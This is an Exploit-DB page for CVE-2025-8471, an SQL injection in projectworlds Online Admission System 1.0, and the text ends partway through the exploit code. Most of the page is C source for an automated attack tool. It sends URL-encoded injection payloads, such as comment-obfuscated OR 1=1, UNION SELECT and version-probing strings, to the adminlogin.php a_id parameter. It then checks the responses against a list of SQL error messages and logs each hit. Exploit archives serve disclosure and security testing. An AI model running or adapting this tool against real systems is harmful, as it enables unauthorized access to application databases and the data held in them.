---
title: [webapps] projectworlds Online Admission System 1.0 - SQL Injection
url: https://www.exploit-db.com/exploits/52398
source: Exploit-DB.com RSS Feed
date: 2025-08-12
fetch_date: 2025-10-07T00:48:15.100469
---

# [webapps] projectworlds Online Admission System 1.0 - SQL Injection

[![Exploit Database](/images/spider-white.png)](/)
[Exploit Database](/)

* [Exploits](/)
* [GHDB](/google-hacking-database)
* [Papers](/papers)
* [Shellcodes](/shellcodes)

---

* [Search EDB](/search)
* [SearchSploit Manual](/searchsploit)
* [Submissions](/submit)

---

* [Online Training](https://www.offsec.com/?utm_source=edb&utm_medium=web&utm_campaign=www)

[![Exploit Database](/images/edb-logo.png)](/)

* [Stats](/exploit-database-statistics)
* [About Us](/)

  [About Exploit-DB](/about-exploit-db)
  [Exploit-DB History](/history)
  [FAQ](/faq)
* Search

# projectworlds Online Admission System 1.0 - SQL Injection

#### EDB-ID:

###### 52398

#### CVE:

###### [2025-8471](https://nvd.nist.gov/vuln/detail/CVE-2025-8471)

---

**EDB Verified:**

#### Author:

###### [Byte Reaper](/?author=12304)

#### Type:

###### [webapps](/?type=webapps)

---

#### Platform:

###### [Multiple](/?platform=multiple)

#### Date:

###### 2025-08-11

---

**Vulnerable App:**

```
/*
 * Title           : projectworlds Online Admission System 1.0 - SQL Injection
 * Author       : Byte Reaper
 * CVE          : CVE-2025-8471
 */
#include <stdio.h>
#include <string.h>
#include <curl/curl.h>
#include <stdlib.h>
#include "argparse.h"
#include <time.h>
#define FULL 2200
int verbose = 0;
int selCookie = 0;
const char *cookies;
void sleepAssembly(void)
{
    struct timespec s ;
    s.tv_sec = 0;
    s.tv_nsec = 500000000;

    __asm__ volatile
    (
        "mov $35, %%rax\n\t"
        "xor %%rsi, %%rsi\n\t"
        "syscall\n\t"
        :
        : "D" (&s)
        : "rax",
          "rsi",
          "memory"
       );
}
void syscallLinux()
{
    __asm__ volatile
    (
        "mov $0x3C, %%rax\n\t"
        "xor %%rdi, %%rdi\n\t"
        "syscall\n\t"
        :
        :
        :"rax", "rdi"
    );
}
struct Mem
{
    char *buffer;
    size_t len;
};
size_t write_cb(void *ptr,
    size_t size,
    size_t nmemb,
    void *userdata)
{
    size_t total = size * nmemb;
    struct Mem *m = (struct Mem *)userdata;
    char *tmp = realloc(m->buffer, m->len + total + 1);
    if (tmp == NULL)
    {
        fprintf(stderr, "\e[1;31m[-] Failed to allocate memory!\e[0m\n");
        syscallLinux();
    }
    m->buffer = tmp;
    memcpy(&(m->buffer[m->len]), ptr, total);
    m->len += total;
    m->buffer[m->len] = '\0';
    return total;
}
int checkLen(int len, char *buf, size_t bufcap)
{
    if (len < 0 || (size_t)len >= bufcap)
    {
        printf("\e[0;31m[-] Len is Long ! \e[0m\n");
        printf("\e[0;31m[-] Len %d\e[0m\n", len);
        syscallLinux();
        return 1;
    }
    else
    {
        printf("\e[0;34m[+] Len Is Not Long.\e[0m\n");
        return 0;

    }
    return 0;
}
// Content Log File (Payload, url, full, http code response)
int logFile(const char *payload, const char *urlB, long httpCodeResponse,size_t lenResponse)
{
    FILE *file = fopen("result.log", "a");
    if (file == NULL)
    {
        printf("\e[0;31m[-] Error Create File (result.log)\e[0m\n");
        syscallLinux();
        return 1;
    }
    printf("\e[0;36m[+] Create Log File Successfully.\e[0m\n");
    char content[1500];
    int lenG = snprintf(content, sizeof(content), "[+] BASE URL : %s\n[+] PAYLOAD Injection : %s\n[+] http code Response %ld\n[+] Response Len : %zu\n\n", urlB, payload, httpCodeResponse, lenResponse);
    if (checkLen(lenG,content , sizeof(content)) == 1)
    {
        printf("\e[0;31m[-] Len Content is Long !\e[0m\n");
        syscallLinux();
        return 1;
    }
    size_t fw = fwrite(content, 1, strlen(content), file);

    if (fw != strlen(content))
    {
        printf("\e[0;31m[-] Error Write Content in Log file !\e[0m\n");
        syscallLinux();
    }
    printf("\e[0;36m[+] Write Log file Content Successfully.\e[0m\n");
    fclose(file);
    if (verbose)
    {
        printf("\e[0;33m[+] Close Log File...\e[0m\n");
    }
    return 0;
}
// Simple Two Stage Injection Payload
const char *twoStageInjection[] =
{
    "INSERT INTO stages (id,code) VALUES (3, 'UNION SELECT NULL --');",
    "SELECT SLEEP(2);",
    "SELECT code FROM stages WHERE id = 3;",
    NULL
};
const char *deepInjection_Payload[] =
{
    "'/**/OR/**/1=1--",
    "'/**/OR/**/'a'='a'--",
    "'/**/OR/**/1=1/**/AND/**/1=1--",
    "'/**/OR/**/1=1/**/AND/**/'1'='1'--",
    "\"/**/OR/**/1=1--",
    "\"/**/OR/**/1=1/**/AND/**/'a'='a'--",
    "'/**/UNION/**/SELECT/**/NULL,NULL--",
    "'/**/AND/**/1=1--",
    "'/**/AND/**/1=2--",
    "'/**/AND/**/'1'='1'--",
    "'/**/AND/**/'1'='2'--",
    "'/**/AND/**/EXISTS(SELECT/**/1)--",
    "'/**/OR/**/EXISTS(SELECT/**/1)--",
    "'/**/OR/**/1=1#",
    "'/**/OR/**/1=1/*",
    "'/**/AND/**/1=1/*",
    "'/**/AND/**/1=2/*",
    "'/**/OR/**/1=2/*",
    "'/**/AND/**/SUBSTRING(@@version,1,1)='5'--",
    "'/**/AND/**/SUBSTRING(@@version,1,1)='8'--",
    "'/**/OR/**/LOWER(database())/**/LIKE/**/'%test%'--",
    "'/**/OR/**/1=1/**/ORDER/**/BY/**/1--",
    NULL
};

const char *wordSql[] =
{
    "syntax error",
    "you have an error in your sql syntax",
    "warning",
    "mysql_fetch",
    "mysql_num_rows",
    "unclosed quotation mark",
    "quoted string not properly terminated",
    "sql syntax error",
    "unexpected end of sql command",
    "syntax error near",
    "database error",
    "query failed",
    "error in your query",
    "unknown column",
    "cannot execute query",
    "invalid query",
    "mysql error",
    "odbc sql",
    "sqlstate",
    "ora-",
    "sql error",
    "error occurred",
    "mysql_fetch_array",
    "native client",
    "syntax error in string in query expression",
    "Microsoft OLE DB Provider for SQL Server",
    "error message",
    "warning: mysql",
    "You have an error in your SQL syntax",
    NULL
};
const char **allTechniques[] =
{
    twoStageInjection,
    deepInjection_Payload,
    NULL
};

size_t  payloadInject(const char *urlP)
{
    CURL *curl = curl_easy_init();
    CURLcode res;
    struct Mem response;
    response.buffer = NULL;
    response.len = 0;
    if (curl == NULL || !curl)
    {
        printf("\e[0;31m[-]  Error Create Object CURL !\e[0m\n");
        syscallLinux();
    }
    if
    (curl)
    {
        char full[FULL];
        for (int t = 0; allTechniques[t] != NULL; t++)
        {
            const char **payloads = allTechniques[t];
            printf("\e[0;35m\n[+] Technique %d:\e[0m\n", t);

            for (int f = 0; payloads[f] != NULL; f++)
            {
                const char *pl = payloads[f];
                char *encode  = curl_easy_escape(curl,
                payloads[f],
                strlen(payloads[f]));
                if (!encode)
                {
                    printf("\e[0;31m[-] Error Encode Payload !\e[0m\n");
                    syscallLinux();
                }
                printf("\e[0;37m[+] Encode Payload : %s\e[0m\n", encode);

                int lenF = snprintf(full,
                        sizeof(full),
                        "%s/adminlogin.php?a_id=%s",urlP, encode);
                if (checkLen(lenF, full,sizeof(full)) == 1)
                {
                    printf("\e[0;31m[-] Len full URL is Long !\e[0m");
                    syscallLinux();
                }
                printf("\e[0;37m[+] Full URL : %s\e[0m\n", full);
                curl_easy_setopt(curl,
                    CURLOPT_URL,
                    full);
                if (selCookie)
                {
                curl_easy_setopt(curl,
                                    CURLOPT_COOKIEFILE,
                                    cookies);
                curl_easy_setopt(curl,
                                    CURLOPT_COOKIEJAR,
                                    cookies);

                }
                curl_easy_setopt(curl,
                                CURLOPT_ACCEPT_ENCODING,
                                "");
                curl_easy_setopt(curl,
                                CURLOPT_FOLLOWLOCATION,
                                1L);
                curl_easy_setopt...